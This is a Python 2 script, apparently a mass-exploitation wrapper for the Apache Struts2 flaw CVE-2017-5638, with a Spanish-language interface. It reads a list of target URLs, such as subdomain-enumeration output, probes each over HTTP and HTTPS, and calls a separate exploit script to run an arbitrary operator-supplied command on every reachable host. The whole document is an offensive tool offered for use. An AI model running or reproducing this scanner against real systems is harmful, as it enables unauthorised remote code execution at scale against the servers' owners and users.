#!/usr/bin/python
#Install Dependencies: easy_install termcolor

import requests
import argparse
import os
from termcolor import colored
import urllib3

def banner():

        print """

:::'###::::'########:::::'###:::::'######::'##::::'##:'########::'######::'########:'########::'##::::'##:'########::'######:::'#######::
::'## ##::: ##.... ##:::'## ##:::'##... ##: ##:::: ##: ##.....::'##... ##:... ##..:: ##.... ##: ##:::: ##:... ##..::'##... ##:'##.... ##:
:'##:. ##:: ##:::: ##::'##:. ##:: ##:::..:: ##:::: ##: ##::::::: ##:::..::::: ##:::: ##:::: ##: ##:::: ##:::: ##:::: ##:::..::..::::: ##:
'##:::. ##: ########::'##:::. ##: ##::::::: #########: ######:::. ######::::: ##:::: ########:: ##:::: ##:::: ##::::. ######:::'#######::
 #########: ##.....::: #########: ##::::::: ##.... ##: ##...:::::..... ##:::: ##:::: ##.. ##::: ##:::: ##:::: ##:::::..... ##:'##::::::::
 ##.... ##: ##:::::::: ##.... ##: ##::: ##: ##:::: ##: ##:::::::'##::: ##:::: ##:::: ##::. ##:: ##:::: ##:::: ##::::'##::: ##: ##::::::::
 ##:::: ##: ##:::::::: ##:::: ##:. ######:: ##:::: ##: ########:. ######::::: ##:::: ##:::. ##:. #######::::: ##::::. ######:: #########:
..:::::..::..:::::::::..:::::..:::......:::..:::::..::........:::......::::::..:::::..:::::..:::.......::::::..::::::......:::.........::


        """
def attack(urls,command):
        methods = ["http://","https://"]
        cont = 0
        urls = open(urls,'r')
        print colored("[+] Total de sitios a escanear: " + str(len(urls.readlines())) + " [+]","green")
        urls.seek(0)
        #urllib3.disable_warnings()
        for url in urls.readlines():
                url = url.strip()
                cont+=1
                for method in methods:
                        try:
                                req = requests.get(method+url,timeout=1.4, verify=False)
                                print colored(str(cont)+ "- " + method+url,"blue")
                                os.system("python CVE-2017-5638/CVE-2017-5638.py "+method+url+" '"+ command+"' ")
                                break
                        except:
                                print str(cont)+ "- "+ method+url + " NOT FOUND"
                                break




parser = argparse.ArgumentParser(
            usage="./ApacheStruts2.py -l [list_target] -c [command]",
            add_help=False,
    )
parser.add_argument("-h", "--help", action="help", help="Mostrar este mensaje de ayuda y salir")
parser.add_argument("-l", dest='list_target', help="Lista de URLS (datos de  Sublister)")
parser.add_argument("-c", dest='command', help="comando a ejecutar")
args = parser.parse_args()

banner()
if args.list_target and args.command:
        attack(args.list_target,args.command)
else:
        parser.print_help()

